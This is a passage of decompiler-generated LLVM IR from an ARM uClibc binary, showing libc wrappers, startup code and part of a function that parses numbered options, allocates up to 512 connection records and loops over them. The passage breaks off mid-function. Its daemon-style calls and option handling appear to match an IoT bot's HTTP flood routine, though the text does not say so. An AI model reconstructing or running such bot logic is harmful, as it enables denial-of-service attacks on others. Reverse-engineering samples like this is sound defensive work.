define i32 @_fork() local_unnamed_addr {
entry:
  %v4_8cb0 = call i32 @fork()
  ret i32 %v4_8cb0
}

define i32 @___uClibc_main(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v4_8cbc = call i32 @__uClibc_main()
  ret i32 %v4_8cbc
}

define i32* @_memset(i32* %s, i32 %c, i32 %n) local_unnamed_addr {
entry:
  %v8_8cc8 = call i32* @memset(i32* %s, i32 %c, i32 %n)
  ret i32* %v8_8cc8
}

define i32 @_getppid() local_unnamed_addr {
entry:
  %v4_8cd4 = call i32 @getppid()
  ret i32 %v4_8cd4
}

define i32 @_time(i32* %timer) local_unnamed_addr {
entry:
  %v6_8ce0 = call i32 @time(i32* %timer)
  ret i32 %v6_8ce0
}

define %__dirstream* @_opendir(i8* %name) local_unnamed_addr {
entry:
  %v6_8cec = call %__dirstream* @opendir(i8* %name)
  ret %__dirstream* %v6_8cec
}

define i32 @_getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen) local_unnamed_addr {
entry:
  %v9_8cf8 = call i32 @getsockopt(i32 %fd, i32 %level, i32 %optname, i32* %optval, i32* %optlen)
  ret i32 %v9_8cf8
}

define i32* @___errno_location() local_unnamed_addr {
entry:
  %v4_8d04 = call i32* @__errno_location()
  ret i32* %v4_8d04
}

; Function Attrs: noreturn
define void @_exit(i32 %status) local_unnamed_addr #0 {
entry:
  call void @exit(i32 %status)
  unreachable
}

define i32 @_open(i8* %file, i32 %oflag, ...) local_unnamed_addr {
entry:
  %v7_8d1c = call i32 (i8*, i32, ...) @open(i8* %file, i32 %oflag)
  ret i32 %v7_8d1c
}

define i32 @_clock() local_unnamed_addr {
entry:
  %v4_8d28 = call i32 @clock()
  ret i32 %v4_8d28
}

define i32 @_setsid() local_unnamed_addr {
entry:
  %v4_8d34 = call i32 @setsid()
  ret i32 %v4_8d34
}

define i32 @_closedir(%__dirstream* %dirp) local_unnamed_addr {
entry:
  %v6_8d40 = call i32 @closedir(%__dirstream* %dirp)
  ret i32 %v6_8d40
}

define i32 @_fcntl(i32 %fd, i32 %cmd, ...) local_unnamed_addr {
entry:
  %v6_8d4c = call i32 (i32, i32, ...) @fcntl(i32 %fd, i32 %cmd)
  ret i32 %v6_8d4c
}

define i32 @_close(i32 %fd) local_unnamed_addr {
entry:
  %v5_8d58 = call i32 @close(i32 %fd)
  ret i32 %v5_8d58
}

define void @_free(i32* %ptr) local_unnamed_addr {
entry:
  call void @free(i32* %ptr)
  ret void
}

define i32 @_sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset) local_unnamed_addr {
entry:
  %v9_8d70 = call i32 @sigprocmask(i32 %how, %_TYPEDEF_sigset_t* %set, %_TYPEDEF_sigset_t* %oset)
  ret i32 %v9_8d70
}

define i32 @_getsockname(i32 %fd, %sockaddr* %addr, i32* %len) local_unnamed_addr {
entry:
  %v9_8d7c = call i32 @getsockname(i32 %fd, %sockaddr* %addr, i32* %len)
  ret i32 %v9_8d7c
}

define i32 @function_8d80() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_8d80 = load i32, i32* @r4, align 4
  store i32 %v3_8d80, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i8** @global_var_1c1a0.55 to i32), i32* %r5.global-to-local, align 4
  %v2_8d88 = load i8, i8* bitcast (i8** @global_var_1c1a0.55 to i8*), align 4
  %v2_8d8c = icmp eq i8 %v2_8d88, 0
  br i1 %v2_8d8c, label %bb7, label %bb

bb:                                               ; preds = %entry
  %v12_8d90 = load i32, i32* @r0, align 4
  ret i32 %v12_8d90

bb7:                                              ; preds = %entry
  store i32 ptrtoint (i32** @global_var_1c184.58 to i32), i32* %r4.global-to-local, align 4
  %v2_8d98 = load i32, i32* bitcast (i32** @global_var_1c184.58 to i32*), align 4
  store i32 %v2_8d98, i32* %r2.global-to-local, align 4
  %v2_8da0 = icmp eq i32 %v2_8d98, 0
  br i1 %v2_8da0, label %bb8, label %dec_label_pc_8da8

dec_label_pc_8da8:                                ; preds = %bb7, %dec_label_pc_8da8.dec_label_pc_8da8_crit_edge
  %v1_8dac = phi i32 [ %v1_8dac.pre, %dec_label_pc_8da8.dec_label_pc_8da8_crit_edge ], [ ptrtoint (i32** @global_var_1c184.58 to i32), %bb7 ]
  %v0_8da8 = phi i32 [ %v2_8db8, %dec_label_pc_8da8.dec_label_pc_8da8_crit_edge ], [ %v2_8d98, %bb7 ]
  %v1_8da8 = add i32 %v0_8da8, 4
  %v2_8dac = inttoptr i32 %v1_8dac to i32*
  store i32 %v1_8da8, i32* %v2_8dac, align 4
  %v0_8db4 = load i32, i32* %r2.global-to-local, align 4
  call void @__pseudo_branch(i32 %v0_8db4)
  %v2_8db8 = load i32, i32* bitcast (i32** @global_var_1c184.58 to i32*), align 4
  store i32 %v2_8db8, i32* %r2.global-to-local, align 4
  %v2_8dc0 = icmp eq i32 %v2_8db8, 0
  br i1 %v2_8dc0, label %.loopexit, label %dec_label_pc_8da8.dec_label_pc_8da8_crit_edge

dec_label_pc_8da8.dec_label_pc_8da8_crit_edge:    ; preds = %dec_label_pc_8da8
  %v1_8dac.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8da8

.loopexit:                                        ; preds = %dec_label_pc_8da8
  %v2_8de0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %bb8

bb8:                                              ; preds = %.loopexit, %bb7
  %v2_8de0 = phi i32 [ %v2_8de0.pre, %.loopexit ], [ ptrtoint (i8** @global_var_1c1a0.55 to i32), %bb7 ]
  %v3_8de0 = inttoptr i32 %v2_8de0 to i8*
  store i8 1, i8* %v3_8de0, align 1
  %v2_8de4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8de4, i32* %r4.global-to-local, align 4
  %v11_8de4 = load i32, i32* @r0, align 4
  ret i32 %v11_8de4

; uselistorder directives
  uselistorder i32 %v2_8db8, { 1, 2, 0 }
  uselistorder i32** @global_var_1c184.58, { 1, 0 }
  uselistorder i8** @global_var_1c1a0.55, { 1, 0 }
  uselistorder label %dec_label_pc_8da8, { 1, 0 }
}

define i32 @function_8df4(i32 %arg1) local_unnamed_addr {
dec_label_pc_8df4:
  %v0_8df4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8df4, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_8df4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_8df4, %bb
  %v5_8dfc = load i32, i32* @r0, align 4
  ret i32 %v5_8dfc

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_8e00() local_unnamed_addr {
.thread:
  %v2_8e20 = load i32, i32* inttoptr (i32 114704 to i32*), align 16
  %v2_8e24 = icmp eq i32 %v2_8e20, 0
  br i1 %v2_8e24, label %bb, label %bb2

bb:                                               ; preds = %.thread
  ret i32 114704

bb2:                                              ; preds = %.thread
  ret i32 114704

; uselistorder directives
  uselistorder i32 114704, { 1, 0, 2 }
}

define i32 @function_8e58() local_unnamed_addr {
dec_label_pc_8e58:
  %v5_8e5c = load i32, i32* @r0, align 4
  ret i32 %v5_8e5c
}

define i32 @__start(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_8e68 = ptrtoint i32* %stack_var_4 to i32
  %v7_8e88 = call i32 @___uClibc_main(i32 ptrtoint (i32* @global_var_fdf8.70 to i32), i32 %arg2, i32 %v4_8e68, i32 35592, i32 79424, i32 %arg1, i32 %v4_8e68)
  ret i32 %v7_8e88
}

define i32 @function_8e9c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8e9c:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-148 = alloca i32, align 4
  %stack_var_-10568 = alloca i32, align 4
  %stack_var_-404 = alloca i32, align 4
  %stack_var_-20809 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_8e9c = load i32, i32* @r4, align 4
  store i32 %v3_8e9c, i32* %stack_var_-36, align 4
  %v6_8e9c = load i32, i32* @r5, align 4
  %v9_8e9c = load i32, i32* @r6, align 4
  %v15_8e9c = load i32, i32* @r8, align 4
  %v1_8ea8 = urem i32 %arg3, 256
  store i32 %v1_8ea8, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_8eb4 = urem i32 %arg1, 256
  store i32 %v1_8eb4, i32* %ip.global-to-local, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v1_8ea8, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v5_8ed0 = inttoptr i32 %arg4 to i32*
  %v6_8ed0 = call i32 @function_ac54(i32 %v1_8ea8, i32* %v5_8ed0, i32 20, i32 0, i32 %arg2)
  %v0_8ed4 = load i32, i32* @r5, align 4
  store i32 %v0_8ed4, i32* %r1.global-to-local, align 4
  store i32 19, i32* %r2.global-to-local, align 4
  %v0_8ee0 = load i32, i32* @r4, align 4
  store i32 %v0_8ee0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_13694.73 to i32), i32* %r3.global-to-local, align 4
  %v5_8ee8 = inttoptr i32 %v0_8ed4 to i32*
  %v6_8ee8 = call i32 @function_ac54(i32 %v0_8ee0, i32* %v5_8ee8, i32 19, i32 ptrtoint ([4 x i8]* @global_var_13694.73 to i32), i32 %v6_8ed0)
  %v0_8eec = load i32, i32* @r5, align 4
  store i32 %v0_8eec, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v6_8ee8, i32* %fp.global-to-local, align 4
  %v0_8efc = load i32, i32* @r4, align 4
  store i32 %v0_8efc, i32* %r0.global-to-local, align 4
  %v5_8f00 = inttoptr i32 %v0_8eec to i32*
  %v6_8f00 = call i32 @function_ac54(i32 %v0_8efc, i32* %v5_8f00, i32 8, i32 0, i32 ptrtoint (i32* @0 to i32))
  %v0_8f04 = load i32, i32* @r5, align 4
  store i32 %v0_8f04, i32* %r1.global-to-local, align 4
  store i32 %v6_8f00, i32* %sb.global-to-local, align 4
  store i32 21, i32* %r2.global-to-local, align 4
  %v0_8f10 = load i32, i32* @r4, align 4
  store i32 %v0_8f10, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_13698.75 to i32), i32* %r3.global-to-local, align 4
  %v5_8f18 = inttoptr i32 %v0_8f04 to i32*
  %v6_8f18 = call i32 @function_ac54(i32 %v0_8f10, i32* %v5_8f18, i32 21, i32 ptrtoint (i32* @global_var_13698.75 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8f1c = load i32, i32* @r5, align 4
  store i32 %v0_8f1c, i32* %r1.global-to-local, align 4
  store i32 %v6_8f18, i32* @sl, align 4
  store i32 23, i32* %r2.global-to-local, align 4
  %v0_8f28 = load i32, i32* @r4, align 4
  store i32 %v0_8f28, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_8f30 = inttoptr i32 %v0_8f1c to i32*
  %v5_8f30 = call i32 @function_ad24(i32 %v0_8f28, i32* %v4_8f30, i32 23, i32 1)
  %v0_8f34 = load i32, i32* @r5, align 4
  store i32 %v0_8f34, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 80, i32* %r3.global-to-local, align 4
  store i32 %v5_8f30, i32* @r6, align 4
  %v0_8f44 = load i32, i32* @r4, align 4
  store i32 %v0_8f44, i32* %r0.global-to-local, align 4
  %v4_8f48 = inttoptr i32 %v0_8f34 to i32*
  %v5_8f48 = call i32 @function_ad24(i32 %v0_8f44, i32* %v4_8f48, i32 7, i32 80)
  %v2_8f50 = ptrtoint i32* %stack_var_-20809 to i32
  %v3_8f58 = mul i32 %v5_8f48, 65536
  store i32 %v3_8f58, i32* %r3.global-to-local, align 4
  %tmp200 = bitcast i32* %stack_var_-20809 to i8*
  store i32 %v2_8f50, i32* %r0.global-to-local, align 4
  store i32 10241, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_8f6c = urem i32 %v5_8f48, 65536
  store i32 %v3_8f6c, i32* %r8.global-to-local, align 4
  %v4_8f70 = call i32* @memset(i32* nonnull %stack_var_-20809, i32 0, i32 10241)
  %v6_8f70 = ptrtoint i32* %v4_8f70 to i32
  store i32 %v6_8f70, i32* %r0.global-to-local, align 4
  %v0_8f74 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_8f74 = icmp slt i32 %v0_8f74, 0
  store i1 %v1_8f74, i1* %cpsr_n.global-to-local, align 1
  %v2_8f74 = icmp eq i32 %v0_8f74, 0
  store i1 %v2_8f74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8f74, label %.thread14, label %bb

bb:                                               ; preds = %dec_label_pc_8e9c
  %v1_8f78 = load i32, i32* %sb.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v2_8f78 = icmp slt i32 %v1_8f78, 0
  store i1 %v2_8f78, i1* %cpsr_n.global-to-local, align 1
  %v3_8f78 = icmp eq i32 %v1_8f78, 0
  store i1 %v3_8f78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8f78, label %bb201, label %dec_label_pc_8f94

.thread14:                                        ; preds = %dec_label_pc_8e9c
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8f88

bb201:                                            ; preds = %bb
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_8f88

dec_label_pc_8f88:                                ; preds = %bb201, %dec_label_pc_8fb4, %.thread14, %dec_label_pc_8fa4, %dec_label_pc_8f94
  %v29_8f90 = phi i32 [ %v2_8fb8, %dec_label_pc_8fb4 ], [ %v6_8f70, %.thread14 ], [ %v6_8f70, %bb201 ], [ %v2_8fa8, %dec_label_pc_8fa4 ], [ %v2_8f98, %dec_label_pc_8f94 ]
  %v2_8f90 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_8f90, i32* %r4.global-to-local, align 4
  store i32 %v6_8e9c, i32* %r5.global-to-local, align 4
  store i32 %v9_8e9c, i32* %r6.global-to-local, align 4
  store i32 %v15_8e9c, i32* %r8.global-to-local, align 4
  ret i32 %v29_8f90

dec_label_pc_8f94:                                ; preds = %bb
  store i32 0, i32* @r4, align 4
  store i32 %v0_8f74, i32* %r0.global-to-local, align 4
  %v1_8f98 = inttoptr i32 %v0_8f74 to i8*
  %v2_8f98 = call i32 @function_12d34(i8* %v1_8f98)
  store i32 %v2_8f98, i32* %r0.global-to-local, align 4
  %v1_8f9c = add i32 %v2_8f98, -255
  %v2_8f9c = icmp ugt i32 %v2_8f98, 254
  store i1 %v2_8f9c, i1* %cpsr_c.global-to-local, align 1
  %v3_8f9c = sub i32 254, %v2_8f98
  %v4_8f9c = and i32 %v3_8f9c, %v2_8f98
  %v5_8f9c = icmp slt i32 %v4_8f9c, 0
  store i1 %v5_8f9c, i1* %cpsr_v.global-to-local, align 1
  %v6_8f9c = icmp slt i32 %v1_8f9c, 0
  store i1 %v6_8f9c, i1* %cpsr_n.global-to-local, align 1
  %v7_8f9c = icmp eq i32 %v2_8f98, 255
  store i1 %v7_8f9c, i1* %cpsr_z.global-to-local, align 1
  %v8_8fa0 = icmp sgt i32 %v2_8f98, 255
  br i1 %v8_8fa0, label %dec_label_pc_8f88, label %dec_label_pc_8fa4

dec_label_pc_8fa4:                                ; preds = %dec_label_pc_8f94
  %v0_8fa4 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_8fa4, i32* %r0.global-to-local, align 4
  %v1_8fa8 = inttoptr i32 %v0_8fa4 to i8*
  %v2_8fa8 = call i32 @function_12d34(i8* %v1_8fa8)
  store i32 %v2_8fa8, i32* %r0.global-to-local, align 4
  %v1_8fac = add i32 %v2_8fa8, -127
  %v2_8fac = icmp ugt i32 %v2_8fa8, 126
  store i1 %v2_8fac, i1* %cpsr_c.global-to-local, align 1
  %v3_8fac = sub i32 126, %v2_8fa8
  %v4_8fac = and i32 %v3_8fac, %v2_8fa8
  %v5_8fac = icmp slt i32 %v4_8fac, 0
  store i1 %v5_8fac, i1* %cpsr_v.global-to-local, align 1
  %v6_8fac = icmp slt i32 %v1_8fac, 0
  store i1 %v6_8fac, i1* %cpsr_n.global-to-local, align 1
  %v7_8fac = icmp eq i32 %v2_8fa8, 127
  store i1 %v7_8fac, i1* %cpsr_z.global-to-local, align 1
  %v8_8fb0 = icmp sgt i32 %v2_8fa8, 127
  br i1 %v8_8fb0, label %dec_label_pc_8f88, label %dec_label_pc_8fb4

dec_label_pc_8fb4:                                ; preds = %dec_label_pc_8fa4
  %v0_8fb4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8fb4, i32* %r0.global-to-local, align 4
  %v1_8fb8 = inttoptr i32 %v0_8fb4 to i8*
  %v2_8fb8 = call i32 @function_12d34(i8* %v1_8fb8)
  store i32 %v2_8fb8, i32* %r0.global-to-local, align 4
  %v1_8fbc = add i32 %v2_8fb8, -9
  %v2_8fbc = icmp ugt i32 %v2_8fb8, 8
  store i1 %v2_8fbc, i1* %cpsr_c.global-to-local, align 1
  %v3_8fbc = sub i32 8, %v2_8fb8
  %v4_8fbc = and i32 %v3_8fbc, %v2_8fb8
  %v5_8fbc = icmp slt i32 %v4_8fbc, 0
  store i1 %v5_8fbc, i1* %cpsr_v.global-to-local, align 1
  %v6_8fbc = icmp slt i32 %v1_8fbc, 0
  store i1 %v6_8fbc, i1* %cpsr_n.global-to-local, align 1
  %v7_8fbc = icmp eq i32 %v2_8fb8, 9
  store i1 %v7_8fbc, i1* %cpsr_z.global-to-local, align 1
  %v7_8fc0 = icmp sgt i32 %v2_8fb8, 9
  br i1 %v7_8fc0, label %dec_label_pc_8f88, label %bb202

bb202:                                            ; preds = %dec_label_pc_8fb4
  %v10_8fc0 = ptrtoint i32* %stack_var_-404 to i32
  store i32 %v10_8fc0, i32* %r2.global-to-local, align 4
  %v8_8fc4 = load i32, i32* @r4, align 4
  %v10_8fc4 = add i32 %v10_8fc0, 364
  %v11_8fc4 = inttoptr i32 %v10_8fc4 to i32*
  store i32 %v8_8fc4, i32* %v11_8fc4, align 4
  br label %dec_label_pc_8fcc

dec_label_pc_8fcc:                                ; preds = %bb202, %bb206
  %v0_8fcc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_8fcc, i32* %r0.global-to-local, align 4
  %v1_8fd0 = inttoptr i32 %v0_8fcc to i8*
  %v2_8fd0 = call i32 @function_12d34(i8* %v1_8fd0)
  store i32 %v2_8fd0, i32* %r0.global-to-local, align 4
  store i32 %v10_8fc0, i32* %r1.global-to-local, align 4
  %v3_8fd8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_8fd8, i32* %ip.global-to-local, align 4
  %v2_8fdc = sub i32 %v2_8fd0, %v3_8fd8
  %v3_8fdc = icmp uge i32 %v2_8fd0, %v3_8fd8
  store i1 %v3_8fdc, i1* %cpsr_c.global-to-local, align 1
  %v4_8fdc = xor i32 %v3_8fd8, %v2_8fd0
  %v5_8fdc = xor i32 %v2_8fdc, %v2_8fd0
  %v6_8fdc = and i32 %v5_8fdc, %v4_8fdc
  %v7_8fdc = icmp slt i32 %v6_8fdc, 0
  store i1 %v7_8fdc, i1* %cpsr_v.global-to-local, align 1
  %v8_8fdc = icmp slt i32 %v2_8fdc, 0
  store i1 %v8_8fdc, i1* %cpsr_n.global-to-local, align 1
  %v9_8fdc = icmp eq i32 %v2_8fd0, %v3_8fd8
  store i1 %v9_8fdc, i1* %cpsr_z.global-to-local, align 1
  %v7_8fe0 = icmp sgt i32 %v2_8fd0, %v3_8fd8
  br i1 %v7_8fe0, label %dec_label_pc_8fe4, label %dec_label_pc_9010

dec_label_pc_8fe4:                                ; preds = %dec_label_pc_8fcc
  %v0_8fe4 = load i32, i32* %fp.global-to-local, align 4
  %v2_8fe4 = add i32 %v0_8fe4, %v3_8fd8
  %v3_8fe4 = inttoptr i32 %v2_8fe4 to i8*
  %v4_8fe4 = load i8, i8* %v3_8fe4, align 1
  %v6_8fe4 = zext i8 %v4_8fe4 to i32
  %v1_8fe8 = add nsw i32 %v6_8fe4, -32
  store i32 %v1_8fe8, i32* %r2.global-to-local, align 4
  %v1_8fec = add nsw i32 %v6_8fe4, -97
  store i32 %v1_8fec, i32* %r3.global-to-local, align 4
  %v2_8ff0 = icmp ugt i32 %v1_8fec, 24
  store i1 %v2_8ff0, i1* %cpsr_c.global-to-local, align 1
  %v3_8ff0 = sub nsw i32 121, %v6_8fe4
  %v4_8ff0 = and i32 %v3_8ff0, %v1_8fec
  %v5_8ff0 = icmp slt i32 %v4_8ff0, 0
  store i1 %v5_8ff0, i1* %cpsr_v.global-to-local, align 1
  %v6_8ff0 = icmp ult i8 %v4_8fe4, 122
  store i1 %v6_8ff0, i1* %cpsr_n.global-to-local, align 1
  %v7_8ff0 = icmp eq i32 %v1_8fec, 25
  store i1 %v7_8ff0, i1* %cpsr_z.global-to-local, align 1
  %v2_8ff4 = xor i1 %v2_8ff0, true
  %v3_8ff4 = or i1 %v7_8ff0, %v2_8ff4
  br i1 %v3_8ff4, label %bb203, label %bb204

bb203:                                            ; preds = %dec_label_pc_8fe4
  %v5_8ff4 = trunc i32 %v1_8fe8 to i8
  store i8 %v5_8ff4, i8* %v3_8fe4, align 1
  %v0_8ff8.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  %v1_8ff8.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br label %bb204

bb204:                                            ; preds = %dec_label_pc_8fe4, %bb203
  %v1_8ffc = phi i1 [ %v2_8ff0, %dec_label_pc_8fe4 ], [ %v1_8ff8.pre, %bb203 ]
  %v0_8ffc = phi i1 [ false, %dec_label_pc_8fe4 ], [ %v0_8ff8.pre, %bb203 ]
  %v2_8ff8 = xor i1 %v1_8ffc, true
  %v3_8ff8 = or i1 %v0_8ffc, %v2_8ff8
  br i1 %v3_8ff8, label %bb205, label %._crit_edge

._crit_edge:                                      ; preds = %bb204
  %v0_9004.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb206

bb205:                                            ; preds = %bb204
  store i32 %v10_8fc0, i32* %r3.global-to-local, align 4
  %v7_8ffc = load i32, i32* %v11_8fc4, align 4
  store i32 %v7_8ffc, i32* %ip.global-to-local, align 4
  br label %bb206

bb206:                                            ; preds = %._crit_edge, %bb205
  %v0_9004 = phi i32 [ %v0_9004.pre, %._crit_edge ], [ %v7_8ffc, %bb205 ]
  store i32 %v10_8fc0, i32* %lr.global-to-local, align 4
  %v1_9004 = add i32 %v0_9004, 1
  store i32 %v1_9004, i32* %ip.global-to-local, align 4
  store i32 %v1_9004, i32* %stack_var_-40, align 4
  br label %dec_label_pc_8fcc

dec_label_pc_9010:                                ; preds = %dec_label_pc_8fcc
  store i32 43, i32* %r0.global-to-local, align 4
  %v1_9014 = call i32 @function_12280(i32 43)
  store i32 44, i32* %r0.global-to-local, align 4
  %v1_901c = call i32 @function_12280(i32 44)
  store i32 45, i32* %r0.global-to-local, align 4
  %v1_9024 = call i32 @function_12280(i32 45)
  store i32 46, i32* %r0.global-to-local, align 4
  %v1_902c = call i32 @function_12280(i32 46)
  store i32 47, i32* %r0.global-to-local, align 4
  %v1_9034 = call i32 @function_12280(i32 47)
  store i32 48, i32* %r0.global-to-local, align 4
  %v1_903c = call i32 @function_12280(i32 48)
  store i32 49, i32* %r0.global-to-local, align 4
  %v1_9044 = call i32 @function_12280(i32 49)
  store i32 50, i32* %r0.global-to-local, align 4
  %v1_904c = call i32 @function_12280(i32 50)
  store i32 51, i32* %r0.global-to-local, align 4
  %v1_9054 = call i32 @function_12280(i32 51)
  store i32 52, i32* %r0.global-to-local, align 4
  %v1_905c = call i32 @function_12280(i32 52)
  store i32 %v1_905c, i32* %r0.global-to-local, align 4
  %v0_9060 = load i32, i32* @r6, align 4
  %v2_9060 = add i32 %v0_9060, -512
  %v3_9060 = icmp ugt i32 %v0_9060, 511
  store i1 %v3_9060, i1* %cpsr_c.global-to-local, align 1
  %v4_9060 = sub i32 511, %v0_9060
  %v5_9060 = and i32 %v4_9060, %v0_9060
  %v6_9060 = icmp slt i32 %v5_9060, 0
  store i1 %v6_9060, i1* %cpsr_v.global-to-local, align 1
  %v7_9060 = icmp slt i32 %v2_9060, 0
  store i1 %v7_9060, i1* %cpsr_n.global-to-local, align 1
  %v8_9060 = icmp eq i32 %v0_9060, 512
  store i1 %v8_9060, i1* %cpsr_z.global-to-local, align 1
  %v5_9064 = icmp slt i32 %v0_9060, 512
  br i1 %v5_9064, label %thread-pre-split, label %bb207

bb207:                                            ; preds = %dec_label_pc_9010
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %dec_label_pc_9010, %bb207
  %v0_906c = phi i32 [ 512, %bb207 ], [ %v0_9060, %dec_label_pc_9010 ]
  store i32 53, i32* %r0.global-to-local, align 4
  %v1_9070 = call i32 @function_12280(i32 53)
  store i32 %v0_906c, i32* %r0.global-to-local, align 4
  store i32 3140, i32* %r1.global-to-local, align 4
  %v2_9080 = call i32* @calloc(i32 %v0_906c, i32 3140)
  %v3_9080 = ptrtoint i32* %v2_9080 to i32
  store i32 %v3_9080, i32* %r0.global-to-local, align 4
  store i32 %v0_906c, i32* %r2.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_9088 = icmp slt i32 %v0_906c, 0
  store i1 %v1_9088, i1* %cpsr_n.global-to-local, align 1
  %v2_9088 = icmp eq i32 %v0_906c, 0
  store i1 %v2_9088, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_9080, i32* @r5, align 4
  %tmp208 = icmp slt i32 %v0_906c, 1
  br i1 %tmp208, label %dec_label_pc_91c4, label %dec_label_pc_9098

dec_label_pc_9098:                                ; preds = %thread-pre-split
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_909c

dec_label_pc_909c:                                ; preds = %dec_label_pc_ab40, %dec_label_pc_9098
  %v1_90a8 = phi i32 [ %v1_ab5c, %dec_label_pc_ab40 ], [ %v3_9080, %dec_label_pc_9098 ]
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  store i32 %v1_8eb4, i32* %r1.global-to-local, align 4
  %v2_90a8 = inttoptr i32 %v1_90a8 to i32*
  store i32 -1, i32* %v2_90a8, align 4
  %v0_90ac = load i32, i32* %r3.global-to-local, align 4
  %v1_90ac = trunc i32 %v0_90ac to i8
  %v2_90ac = load i32, i32* @r5, align 4
  %v3_90ac = add i32 %v2_90ac, 4
  %v4_90ac = inttoptr i32 %v3_90ac to i8*
  store i8 %v1_90ac, i8* %v4_90ac, align 1
  %v0_90b0 = load i32, i32* @r7, align 4
  %v1_90b4 = load i32, i32* %r1.global-to-local, align 4
  %v2_90b4 = srem i32 %v0_90b0, %v1_90b4
  store i32 %v2_90b4, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v2_90c0 = and i32 %v2_90b4, 536870912
  %v3_90c0 = icmp ne i32 %v2_90c0, 0
  store i1 %v3_90c0, i1* %cpsr_c.global-to-local, align 1
  %v5_90c0 = mul i32 %v2_90b4, 24
  store i32 %v5_90c0, i32* %r3.global-to-local, align 4
  %v2_90c4 = add i32 %v5_90c0, %arg2
  store i32 %v2_90c4, i32* @r6, align 4
  %v1_90c8 = add i32 %v2_90c4, 16
  %v2_90c8 = inttoptr i32 %v1_90c8 to i32*
  %v3_90c8 = load i32, i32* %v2_90c8, align 4
  store i32 %v3_90c8, i32* %r2.global-to-local, align 4
  %v0_90cc = load i32, i32* @r5, align 4
  %v1_90cc = add i32 %v0_90cc, 532
  store i32 %v1_90cc, i32* %lr.global-to-local, align 4
  store i32 %v1_90cc, i32* @r0, align 4
  %v0_90d4 = load i32, i32* @sl, align 4
  store i32 %v0_90d4, i32* %r1.global-to-local, align 4
  %v2_90d8 = add i32 %v0_90cc, 16
